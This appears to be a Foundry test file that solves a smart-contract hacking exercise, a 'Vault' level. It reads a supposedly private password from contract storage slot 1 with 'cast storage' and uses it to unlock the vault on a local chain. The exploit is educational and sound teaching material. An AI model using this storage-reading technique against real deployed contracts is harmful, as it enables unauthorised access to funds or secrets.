/*
* Don't look at the solution without trying yourself first!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { Vault } from "@src/08-Vault/Vault.sol";

contract HackVault is Test {
    Vault public vault;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");

        vm.prank(deployer);
        // don't look here!
        vault = new Vault(bytes32("Secret!"));
    }

    function testUnlockTheVault() public {
        // hack the contract
        // your code goes here

        vm.startPrank(attacker);
        // contract variables are visible to everyone on-chain!
        // spin up a local chain using anvil
        // use script/08-Vault/deployVault.s.sol to deploy the Vault contract on anvil
        // forge script script/08-vault/deployVault.s.sol:DeployVault --rpc-url http://127.0.0.1:8545 --broadcast -vvv
        // then use cast to look up the second storage slot, the password!
        // cast storage <deployed_contract_address> 1
        bytes32 password = bytes32(0x5365637265742100000000000000000000000000000000000000000000000000);
        vault.unlock(password);
        vm.stopPrank();

        assertEq(vault.locked(), false);
    }
}
